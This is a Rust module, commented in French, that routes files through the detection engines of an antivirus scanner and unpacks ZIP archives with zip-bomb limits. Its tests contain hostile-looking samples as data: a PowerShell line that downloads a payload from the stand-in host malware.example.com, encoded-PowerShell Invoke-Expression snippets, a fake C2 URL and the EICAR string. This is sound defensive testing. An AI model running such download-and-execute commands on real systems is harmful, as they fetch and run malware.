//! dispatcher — routage des cibles vers les moteurs pertinents (feuille de route §1).
//!
//! Pipeline de détection (conforme au document de recherche optiCOMBAT) :
//!
//! ```text
//! Fichier → SHA-256 → base de hachage (reputation / MalwareBazaar)
//!         → extraction / archives → ClamAV
//!         → règles YARA locales
//!         → heuristique PE / ML
//!         → IOC URL/domaine/IP (ioc-engine : URLhaus + ThreatFox)
//!         → verdict + score de confiance
//! ```
//!
//! Le dispatcher ne contient AUCUNE logique de détection : il orchestre.

use std::io::{Cursor, Read};
use std::path::Path;

pub mod threat_intel;
pub use threat_intel::{ThreatIntelBundle, ThreatIntelStats};

use clamav::CompositeClamAvBackend;
use correlator::{correlate, FinalDecision};
use engine_core::{
    Detection, Engine, EngineResult, FileKind, ScanContext, Severity, SignatureEngine, Verdict,
};
use heuristics::HeuristicEngine;
use ioc_engine::extractor::{extract_from_text, is_likely_text};
use ioc_engine::{IocEngine, IocSource};
use ml_classifier::Classifier;
use reputation::{Reputation, ReputationEngine};
use sandbox::Sandbox;
use yara_engine::YaraEngine;

/// Détecte le type de contenu par les magic bytes (proxy du vrai détecteur).
pub fn detect_kind(data: &[u8], path: &Path) -> FileKind {
    if data.len() >= 2 && &data[0..2] == b"MZ" {
        return FileKind::PortableExecutable;
    }
    if data.len() >= 4 && &data[0..4] == b"%PDF" {
        return FileKind::Pdf;
    }
    // Extension normalisée en minuscules : « RAPPORT.DOCM » ou « RUN.PS1 »
    // échappaient auparavant au routage (comparaison sensible à la casse).
    let ext = path
        .extension()
        .and_then(|e| e.to_str())
        .map(|e| e.to_ascii_lowercase());
    if data.len() >= 4 && &data[0..4] == b"PK\x03\x04" {
        // ZIP : Office OOXML (y compris les formats à macros *m) ou archive simple.
        return match ext.as_deref() {
            Some(
                "docx" | "docm" | "dotx" | "dotm" | "xlsx" | "xlsm" | "xltx" | "xltm" | "xlam"
                | "pptx" | "pptm" | "potx" | "potm" | "ppsx" | "ppsm",
            ) => FileKind::OfficeDocument,
            _ => FileKind::Archive,
        };
    }
    match ext.as_deref() {
        Some(
            "ps1" | "psm1" | "psd1" | "js" | "jse" | "vbs" | "vbe" | "wsf" | "wsh" | "hta" | "bat"
            | "cmd",
        ) => FileKind::Script,
        _ => FileKind::Unknown,
    }
}

pub struct Dispatcher {
    clam: CompositeClamAvBackend,
    yara: YaraEngine,
    heur: HeuristicEngine,
    sandbox: Sandbox,
    ml: Classifier,
    reputation: ReputationEngine,
    /// Moteur IOC réseau (URLhaus + ThreatFox) — vide si aucune liste n'est disponible.
    ioc: IocEngine,
    /// Compteurs de la threat intel chargée (zéro si aucun dossier).
    intel_stats: ThreatIntelStats,
}

impl Dispatcher {
    /// Dispatcher par défaut. Si `OPTICOMBAT_THREAT_INTEL_DIR` désigne un dossier,
    /// les feeds abuse.ch qu'il contient sont chargés (voir [`threat_intel`]).
    pub fn new() -> Self {
        match ThreatIntelBundle::dir_from_env() {
            Some(dir) => Self::with_threat_intel_dir(&dir),
            None => Self::with_reputation(ReputationEngine::from_env()),
        }
    }

    /// Dispatcher alimenté par les feeds abuse.ch d'un dossier local
    /// (MalwareBazaar → réputation, URLhaus/ThreatFox → IOC).
    pub fn with_threat_intel_dir(dir: &Path) -> Self {
        Self::with_threat_intel(
            ReputationEngine::from_env(),
            ThreatIntelBundle::load_dir(dir),
        )
    }

    /// Dispatcher alimenté par un bundle déjà chargé.
    pub fn with_threat_intel(mut reputation: ReputationEngine, bundle: ThreatIntelBundle) -> Self {
        let ThreatIntelBundle { bazaar, ioc, stats } = bundle;
        if bazaar.hash_count() > 0 {
            reputation.push_source(Box::new(bazaar));
        }
        let mut d = Self::with_ioc(reputation, ioc);
        d.intel_stats = stats;
        d
    }

    /// Compteurs de la threat intel actuellement chargée.
    pub fn threat_intel_stats(&self) -> ThreatIntelStats {
        self.intel_stats
    }

    /// Vrai si un démon clamd (signatures ClamAV complètes) répond. Sinon le
    /// moteur « clamav » ne reconnaît que la signature de test EICAR.
    pub fn clamd_available(&self) -> bool {
        self.clam.clamd_available()
    }

    /// Construit un dispatcher avec une source de réputation ET un moteur IOC.
    pub fn with_ioc(reputation: ReputationEngine, ioc: IocEngine) -> Self {
        Self {
            clam: CompositeClamAvBackend::new(),
            yara: YaraEngine::new(),
            heur: HeuristicEngine::new(),
            sandbox: Sandbox::new(),
            ml: Classifier::new(),
            ioc,
            reputation,
            intel_stats: ThreatIntelStats::default(),
        }
    }

    pub fn with_reputation(reputation: ReputationEngine) -> Self {
        Self {
            clam: CompositeClamAvBackend::new(),
            yara: YaraEngine::new(),
            heur: HeuristicEngine::new(),
            sandbox: Sandbox::new(),
            ml: Classifier::new(),
            ioc: IocEngine::empty(),
            reputation,
            intel_stats: ThreatIntelStats::default(),
        }
    }

    /// Pipeline complet sur une cible : détection de type → moteurs → corrélation.
    /// Les archives sont déballées et leurs membres scannés récursivement.
    pub fn scan_path(&self, path: &Path) -> std::io::Result<FinalDecision> {
        let data = match std::fs::read(path) {
            Ok(data) => data,
            Err(e) if is_os_virus_block(&e) => return Ok(os_blocked_decision(&e)),
            Err(e) => return Err(e),
        };

        // Réputation par hash AVANT analyse : blacklist tranche, whitelist
        // supprime (faux positif évité), inconnu → pipeline complet.
        match self.reputation.evaluate(&data) {
            Reputation::Blacklisted(name) => {
                return Ok(correlate(&[reputation_result(
                    Verdict::Malicious,
                    Severity::Critical,
                    100,
                    name.clone(),
                    format!("Hash en liste noire : {name}"),
                )]));
            }
            Reputation::Whitelisted => {
                return Ok(correlate(&[reputation_result(
                    Verdict::Clean,
                    Severity::Clean,
                    0,
                    "Whitelisted".into(),
                    "Hash de confiance (whitelist) — analyse supprimée".into(),
                )]));
            }
            Reputation::Unknown => {}
        }

        let results = self.scan_all(path, &data, 0);
        Ok(correlate(&results))
    }

    /// Exécute les moteurs sur la cible, puis déballe si c'est une archive.
    fn scan_all(&self, path: &Path, data: &[u8], depth: u8) -> Vec<EngineResult> {
        let mut results = self.run_engines(path, data);
        let kind = detect_kind(data, path);
        if matches!(kind, FileKind::Archive) && depth < MAX_ARCHIVE_DEPTH {
            results.extend(self.scan_archive(data, depth));
        }
        results
    }

    /// Applique les moteurs pertinents à un fichier (sans déballage).
    fn run_engines(&self, path: &Path, data: &[u8]) -> Vec<EngineResult> {
        let kind = detect_kind(data, path);
        // Le contenu est partagé avec tous les moteurs : une seule lecture disque.
        let ctx = ScanContext::new(path.to_path_buf(), kind, data.len() as u64)
            .with_data(std::sync::Arc::from(data));
        let mut results: Vec<EngineResult> = Vec::new();

        // 1) Moteur de signatures (toujours).
        match self.clam.scan_bytes(path, data) {
            Ok(r) => results.push(r),
            Err(_) => results.push(EngineResult::inconclusive("clamav")),
        }
        // 2) YARA si applicable.
        if self.yara.applicable(&ctx) {
            if let Ok(r) = self.yara.scan(&ctx) {
                results.push(r);
            }
        }
        // 3) Heuristique PE si applicable.
        if self.heur.applicable(&ctx) {
            if let Ok(r) = self.heur.scan(&ctx) {
                results.push(r);
            }
        }
        // 4) Sandbox comportementale (PE/scripts/Office).
        if self.sandbox.applicable(&ctx) {
            if let Ok(r) = self.sandbox.scan(&ctx) {
                results.push(r);
            }
        }
        // 5) Classifieur ML (PE).
        if self.ml.applicable(&ctx) {
            if let Ok(r) = self.ml.scan(&ctx) {
                results.push(r);
            }
        }
        // 6) IOC réseau — extraction d'URLs/IPs depuis scripts et fichiers texte.
        //    Couche 3 du pipeline défini dans le document de recherche optiCOMBAT :
        //    URLhaus (distribution de malwares) + ThreatFox (IOC communautaires).
        //    Activé uniquement si au moins un feed est chargé (is_empty = false).
        if !self.ioc.is_empty()
            && matches!(kind, FileKind::Script | FileKind::Unknown)
            && is_likely_text(data)
        {
            if let Ok(text) = std::str::from_utf8(data) {
                let indicators = extract_from_text(text);
                let hits = self.ioc.check_all(&indicators);
                if !hits.is_empty() {
                    results.push(ioc_engine_result(&hits));
                }
            }
        }
        results
    }

    /// Déballe une archive ZIP et scanne chaque membre (avec garde-fous
    /// anti zip-bomb : profondeur, nombre d'entrées, taille décompressée).
    fn scan_archive(&self, data: &[u8], depth: u8) -> Vec<EngineResult> {
        let mut out = Vec::new();
        let Ok(mut archive) = zip::ZipArchive::new(Cursor::new(data)) else {
            return out;
        };
        let count = archive.len().min(MAX_ARCHIVE_ENTRIES);
        // Budget global de décompression par archive (anti zip-bomb) : sans lui,
        // 256 membres × 64 Mio pouvaient être écrits sur disque à chaque niveau.
        let mut budget = MAX_ARCHIVE_TOTAL_BYTES;
        for i in 0..count {
            if budget == 0 {
                break;
            }
            let Ok(entry) = archive.by_index(i) else {
                continue;
            };
            if !entry.is_file() {
                continue;
            }
            let Ok(name) = entry.name().map(|n| n.into_owned()) else {
                continue;
            };
            let mut buf = Vec::new();
            if entry
                .take(MAX_MEMBER_SIZE.min(budget))
                .read_to_end(&mut buf)
                .is_err()
            {
                continue;
            }
            budget = budget.saturating_sub(buf.len() as u64);
            // Écrit dans un fichier temporaire pour réutiliser tout le pipeline.
            // Nom unique (pid + compteur) et création exclusive : deux membres de
            // même nom, ou deux scans concurrents, ne s'écrasent plus, et un
            // fichier/lien préexistant n'est jamais réutilisé.
            let Some(tmp) = write_unique_temp(depth, &name, &buf) else {
                continue;
            };
            let mut member = self.scan_all(&tmp, &buf, depth + 1);
            let _ = std::fs::remove_file(&tmp);
            // Trace le membre dans chaque explication pour l'auditabilité.
            for r in &mut member {
                for d in &mut r.detections {
                    d.explanation = format!("[zip:{name}] {}", d.explanation);
                }
            }
            out.extend(member);
        }
        out
    }
}

/// Garde-fous de déballage d'archives.
const MAX_ARCHIVE_DEPTH: u8 = 2;
const MAX_ARCHIVE_ENTRIES: usize = 256;
const MAX_MEMBER_SIZE: u64 = 64 * 1024 * 1024;
const MAX_ARCHIVE_TOTAL_BYTES: u64 = 256 * 1024 * 1024;

/// Crée un fichier temporaire exclusif (`create_new`) pour un membre d'archive.
fn write_unique_temp(depth: u8, name: &str, data: &[u8]) -> Option<std::path::PathBuf> {
    use std::io::Write;
    use std::sync::atomic::{AtomicU64, Ordering};
    static SEQ: AtomicU64 = AtomicU64::new(0);
    for _ in 0..8 {
        let seq = SEQ.fetch_add(1, Ordering::Relaxed);
        let tmp = std::env::temp_dir().join(format!(
            "oc_zip_{}_{}_{}_{}",
            std::process::id(),
            seq,
            depth,
            sanitize(name)
        ));
        match std::fs::OpenOptions::new()
            .write(true)
            .create_new(true)
            .open(&tmp)
        {
            Ok(mut f) => {
                if f.write_all(data).is_err() {
                    drop(f);
                    let _ = std::fs::remove_file(&tmp);
                    return None;
                }
                return Some(tmp);
            }
            Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists => continue,
            Err(_) => return None,
        }
    }
    None
}

/// Réduit un nom de membre à un suffixe de fichier temporaire sûr.
fn sanitize(name: &str) -> String {
    name.chars()
        .map(|c| if c.is_ascii_alphanumeric() { c } else { '_' })
        .collect::<String>()
        .chars()
        .rev()
        .take(40)
        .collect::<String>()
        .chars()
        .rev()
        .collect()
}

/// Windows : lecture refusée parce que le fichier est déjà jugé malveillant.
/// ERROR_VIRUS_INFECTED (225) et ERROR_VIRUS_DELETED (226).
fn is_os_virus_block(err: &std::io::Error) -> bool {
    matches!(err.raw_os_error(), Some(225 | 226))
}

/// Décision lorsque l'OS bloque la lecture : ce n'est pas un échec d'analyse.
fn os_blocked_decision(err: &std::io::Error) -> FinalDecision {
    correlate(&[EngineResult {
        engine: "windows".into(),
        verdict: Verdict::Malicious,
        detections: vec![Detection {
            engine: "windows".into(),
            name: "Win32.OsBlocked".into(),
            score: 100,
            severity: Severity::Critical,
            explanation: format!("Windows a refusé la lecture : {err}"),
        }],
        elapsed_ms: 0,
    }])
}

/// Construit un EngineResult de réputation pour le corrélateur.
fn reputation_result(
    verdict: Verdict,
    severity: Severity,
    score: i32,
    name: String,
    explanation: String,
) -> EngineResult {
    let detections = if score > 0 {
        vec![Detection {
            engine: "reputation".into(),
            name,
            score,
            severity,
            explanation,
        }]
    } else {
        Vec::new()
    };
    EngineResult {
        engine: "reputation".into(),
        verdict,
        detections,
        elapsed_ms: 0,
    }
}

/// Convertit une liste de correspondances IOC en un `EngineResult` pour le corrélateur.
fn ioc_engine_result(hits: &[ioc_engine::IocMatch]) -> EngineResult {
    use std::time::Instant;
    let t = Instant::now();
    let detections = hits
        .iter()
        .map(|h| {
            let source_label = match h.source {
                IocSource::Urlhaus => "URLhaus",
                IocSource::Threatfox => "ThreatFox",
            };
            Detection {
                engine: "ioc".into(),
                name: format!("IOC.{source_label}"),
                score: h.confidence as i32,
                severity: Severity::Major,
                explanation: format!(
                    "[{source_label}] {:?} «{}» — confiance {}%",
                    h.kind, h.ioc, h.confidence
                ),
            }
        })
        .collect::<Vec<_>>();
    let verdict = if detections.iter().any(|d| d.score >= 75) {
        Verdict::Malicious
    } else {
        Verdict::Suspicious
    };
    EngineResult {
        engine: "ioc".into(),
        verdict,
        detections,
        elapsed_ms: t.elapsed().as_millis(),
    }
}

impl Default for Dispatcher {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use engine_core::Verdict;
    use ioc_engine::IocEngine;
    use std::io::Write;

    fn tmp(data: &[u8], ext: &str) -> std::path::PathBuf {
        use std::sync::atomic::{AtomicU32, Ordering};
        static N: AtomicU32 = AtomicU32::new(0);
        let uid = N.fetch_add(1, Ordering::Relaxed);
        let p = std::env::temp_dir().join(format!("oc_disp_{}_{}.{ext}", std::process::id(), uid));
        std::fs::File::create(&p).unwrap().write_all(data).unwrap();
        p
    }

    #[test]
    fn route_script_powershell_suspect() {
        // Règle YARA « medium » + indicateurs comportementaux faibles : indice,
        // pas preuve → Suspicious (n'est plus auto-mis en quarantaine).
        let p = tmp(b"powershell -enc ZQ== ; Invoke-Expression $x", "ps1");
        let d = Dispatcher::new().scan_path(&p).unwrap();
        assert_eq!(d.verdict, Verdict::Suspicious);
        let _ = std::fs::remove_file(p);
    }

    #[test]
    fn extension_insensible_a_la_casse() {
        assert_eq!(detect_kind(b"x", Path::new("RUN.PS1")), FileKind::Script);
        assert_eq!(
            detect_kind(b"PK\x03\x04", Path::new("Rapport.DOCM")),
            FileKind::OfficeDocument
        );
        assert_eq!(detect_kind(b"x", Path::new("a.hta")), FileKind::Script);
    }

    #[test]
    fn temp_unique_ne_reutilise_pas_un_fichier_existant() {
        let a = write_unique_temp(0, "same.txt", b"a").unwrap();
        let b = write_unique_temp(0, "same.txt", b"b").unwrap();
        assert_ne!(a, b);
        assert_eq!(std::fs::read(&a).unwrap(), b"a");
        let _ = std::fs::remove_file(a);
        let _ = std::fs::remove_file(b);
    }

    #[test]
    fn eicar_complet_est_malveillant_meme_si_windows_bloque_la_lecture() {
        let p = tmp(
            br"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*",
            "com",
        );
        let d = Dispatcher::new().scan_path(&p).unwrap();
        assert_eq!(d.verdict, Verdict::Malicious);
        let _ = std::fs::remove_file(p);
    }

    #[test]
    fn fichier_texte_propre() {
        let p = tmp(b"juste du texte normal", "txt");
        let d = Dispatcher::new().scan_path(&p).unwrap();
        assert_eq!(d.verdict, Verdict::Clean);
        let _ = std::fs::remove_file(p);
    }

    #[test]
    fn detection_type_pe() {
        assert_eq!(
            detect_kind(b"MZ\x90\x00", Path::new("a.exe")),
            FileKind::PortableExecutable
        );
        assert_eq!(detect_kind(b"%PDF-1.7", Path::new("a.pdf")), FileKind::Pdf);
    }

    #[test]
    fn ioc_engine_detecte_url_urlhaus() {
        use ioc_engine::urlhaus::UrlhausFeed;
        use ioc_engine::IocEngine;

        // Feed URLhaus avec une URL de test
        let mut feed = UrlhausFeed::new();
        feed.load_text("http://malware.example.com/payload.exe\n");
        let ioc = IocEngine::new(vec![Box::new(feed)]);

        let script = b"powershell -c (New-Object Net.WebClient).DownloadFile('http://malware.example.com/payload.exe','x.exe')";
        let p = tmp(script, "ps1");
        let d = Dispatcher::with_ioc(ReputationEngine::from_env(), ioc)
            .scan_path(&p)
            .unwrap();
        // L'URL est connue → au moins Suspicious ou Malicious
        assert!(
            d.verdict == Verdict::Suspicious || d.verdict == Verdict::Malicious,
            "attendu Suspicious/Malicious, obtenu {:?}",
            d.verdict
        );
        let _ = std::fs::remove_file(p);
    }

    fn intel_dir(tag: &str) -> std::path::PathBuf {
        use std::sync::atomic::{AtomicU32, Ordering};
        static N: AtomicU32 = AtomicU32::new(0);
        let d = std::env::temp_dir().join(format!(
            "oc_disp_ti_{tag}_{}_{}",
            std::process::id(),
            N.fetch_add(1, Ordering::Relaxed)
        ));
        std::fs::create_dir_all(&d).unwrap();
        d
    }

    #[test]
    fn hash_malwarebazaar_du_dossier_rend_le_fichier_malveillant() {
        let payload = b"charge utile de test opticombat malwarebazaar";
        let sha = ReputationEngine::sha256_hex(payload);
        let dir = intel_dir("mb");
        std::fs::write(
            dir.join(threat_intel::MALWAREBAZAAR_CSV),
            format!("\"2026-10-23 10:00:00\", \"{sha}\", \"m\", \"s\", \"r\", \"x.bin\", \"exe\", \"mime\", \"Formbook\", \"n/a\"\n"),
        )
        .unwrap();
        let d = Dispatcher::with_threat_intel_dir(&dir);
        assert_eq!(d.threat_intel_stats().malwarebazaar_hashes, 1);
        let p = tmp(payload, "bin");
        let decision = d.scan_path(&p).unwrap();
        assert_eq!(decision.verdict, Verdict::Malicious);
        assert!(decision
            .reasons
            .iter()
            .any(|r| r.engine == "reputation" && r.name == "MalwareBazaar:Formbook"));
        let _ = std::fs::remove_file(p);
        let _ = std::fs::remove_dir_all(dir);
    }

    #[test]
    fn ioc_threatfox_du_dossier_signale_le_script() {
        let dir = intel_dir("tf");
        std::fs::write(
            dir.join(threat_intel::THREATFOX_CSV),
            "\"2026-10-23 10:00:00\", \"1\", \"https://c2.example.net/gate.php\", \"url\", \"botnet_cc\", \"win.x\", \"None\", \"XWorm\", \"\", \"90\", \"0\", \"\", \"\", \"0\", \"r\"\n",
        )
        .unwrap();
        let d = Dispatcher::with_threat_intel_dir(&dir);
        assert_eq!(d.threat_intel_stats().threatfox_iocs, 1);
        let p = tmp(
            b"$u='https://c2.example.net/gate.php'; Write-Host $u",
            "ps1",
        );
        let decision = d.scan_path(&p).unwrap();
        // Indicateur réseau seul : pas une preuve → Suspicious, avec l'explication IOC.
        assert_eq!(decision.verdict, Verdict::Suspicious);
        assert!(decision
            .reasons
            .iter()
            .any(|r| r.engine == "ioc" && r.name == "IOC.ThreatFox"));
        let _ = std::fs::remove_file(p);
        let _ = std::fs::remove_dir_all(dir);
    }

    fn zip_bytes(entries: &[(&str, &[u8])], dirs: &[&str]) -> Vec<u8> {
        use std::io::Write as _;
        let mut buf = std::io::Cursor::new(Vec::new());
        {
            let mut z = zip::ZipWriter::new(&mut buf);
            let opts = zip::write::SimpleFileOptions::default()
                .compression_method(zip::CompressionMethod::Deflated);
            for d in dirs {
                z.add_directory(*d, opts).unwrap();
            }
            for (name, data) in entries {
                z.start_file(*name, opts).unwrap();
                z.write_all(data).unwrap();
            }
            z.finish().unwrap();
        }
        buf.into_inner()
    }

    #[test]
    fn archive_zip_membres_analyses_et_traces() {
        let inner = zip_bytes(
            &[("deep.ps1", b"powershell -enc ZQ== ; Invoke-Expression $x")],
            &[],
        );
        let outer = zip_bytes(
            &[
                ("run.ps1", b"powershell -enc ZQ== ; Invoke-Expression $x"),
                ("readme.txt", b"bonjour"),
                ("nested.zip", &inner),
            ],
            &["dossier/"],
        );
        let p = tmp(&outer, "zip");
        let d = Dispatcher::with_reputation(ReputationEngine::from_env())
            .scan_path(&p)
            .unwrap();
        assert_eq!(d.verdict, Verdict::Suspicious, "{:?}", d.reasons);
        assert!(d
            .reasons
            .iter()
            .any(|r| r.explanation.starts_with("[zip:run.ps1]")));
        // Membre d'une archive imbriquée (profondeur 2) : double préfixe.
        assert!(
            d.reasons
                .iter()
                .any(|r| r.explanation.starts_with("[zip:nested.zip] [zip:deep.ps1]")),
            "{:?}",
            d.reasons
        );
        let _ = std::fs::remove_file(p);
    }

    #[test]
    fn archive_corrompue_et_profondeur_maximale() {
        let disp = Dispatcher::with_reputation(ReputationEngine::from_env());
        // En-tête ZIP sans répertoire central : ignorée, pas d'erreur.
        assert!(disp.scan_archive(b"PK\x03\x04 tronque", 0).is_empty());
        // À la profondeur maximale, une archive n'est plus déballée.
        let z = zip_bytes(&[("a.ps1", b"powershell -enc ZQ==")], &[]);
        let r = disp.scan_all(Path::new("x.zip"), &z, MAX_ARCHIVE_DEPTH);
        assert!(r.iter().all(|e| e
            .detections
            .iter()
            .all(|d| !d.explanation.starts_with("[zip:"))));
    }

    #[test]
    fn sanitize_tronque_et_remplace() {
        assert_eq!(sanitize("a/b c.ps1"), "a_b_c_ps1");
        let long = "x".repeat(100) + ".exe";
        let s = sanitize(&long);
        assert_eq!(s.len(), 40);
        assert!(s.ends_with("_exe"));
    }

    #[test]
    fn blocage_os_et_resultat_de_reputation() {
        assert!(is_os_virus_block(&std::io::Error::from_raw_os_error(225)));
        assert!(is_os_virus_block(&std::io::Error::from_raw_os_error(226)));
        assert!(!is_os_virus_block(&std::io::Error::from_raw_os_error(2)));
        let d = os_blocked_decision(&std::io::Error::from_raw_os_error(225));
        assert_eq!(d.verdict, Verdict::Malicious);
        let clean = reputation_result(Verdict::Clean, Severity::Clean, 0, "w".into(), "e".into());
        assert!(clean.detections.is_empty());
    }

    #[test]
    fn ioc_confiance_faible_reste_suspect() {
        use ioc_engine::{IocKind, IocMatch};
        let r = ioc_engine_result(&[IocMatch {
            ioc: "1.2.3.4".into(),
            kind: IocKind::Ip,
            source: IocSource::Urlhaus,
            threat: None,
            confidence: 50,
        }]);
        assert_eq!(r.verdict, Verdict::Suspicious);
        assert_eq!(r.detections[0].name, "IOC.URLhaus");
    }

    #[test]
    fn fichier_absent_est_une_erreur_et_default_fonctionne() {
        let d = Dispatcher::default();
        assert!(d.scan_path(Path::new("/oc/absent.bin")).is_err());
        let _ = d.clamd_available();
    }

    #[test]
    fn dispatcher_sans_intel_a_des_stats_nulles() {
        let d = Dispatcher::with_reputation(ReputationEngine::from_env());
        assert_eq!(d.threat_intel_stats().total(), 0);
        let d =
            Dispatcher::with_threat_intel(ReputationEngine::from_env(), ThreatIntelBundle::empty());
        assert_eq!(d.threat_intel_stats().total(), 0);
    }

    #[test]
    fn ioc_engine_vide_ne_change_pas_verdict() {
        // Sans feed IOC chargé, le script propre reste Clean.
        let script = b"Write-Host 'hello world'";
        let p = tmp(script, "ps1");
        let d = Dispatcher::with_ioc(ReputationEngine::from_env(), IocEngine::empty())
            .scan_path(&p)
            .unwrap();
        assert_eq!(d.verdict, Verdict::Clean);
        let _ = std::fs::remove_file(p);
    }
}
